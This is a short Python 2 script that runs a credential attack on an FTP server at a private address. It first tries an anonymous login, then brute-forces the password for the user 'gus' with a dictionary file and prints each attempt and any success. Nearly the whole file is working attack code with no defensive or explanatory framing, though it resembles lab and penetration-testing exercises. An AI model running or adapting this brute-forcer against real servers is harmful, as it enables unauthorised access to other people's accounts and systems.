import ftplib

def connect(host,user,password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user,password)
        ftp.quit()
        return True
    except:
        return False

def main():
    # Variables
    targetHostAddress = '10.0.0.24'
    userName = 'gus'
    passwordsFilePath = 'passwords.txt'

    #Try to connect using anonymous credentials
    print '[+] Using anonymous credentials for ' + targetHostAddress
    if connect(targetHostAddress,'anonymous','test@test.com'):
        print '[*] FTP Anonymous log on succeeded on host ' + targetHostAddress
    else:
        print '[*] FTP Anonymous log on failed on host ' + targetHostAddress

        #Try brute force using dictionary file

        # Open passwords dictionary file
        passwordsFile = open(passwordsFilePath,'r')
    
        for line in passwordsFile.readlines():
            # clean the lines in the dictionary file
            password = line.strip('\r').strip('\n')
            print "Testing: " + str(password)

            if connect(targetHostAddress,userName,password):
                # Password Found
                print "[*] FTP Logon succeeded on host " + targetHostAddress + " UserName:" + userName + " Password:" + password
                exit(0)
            else:
                # Password Not Found
                print "[*] FTP Logon failed on host " + targetHostAddress + " UserName:" + userName + " Password:" + password

if __name__ == "__main__":
    main()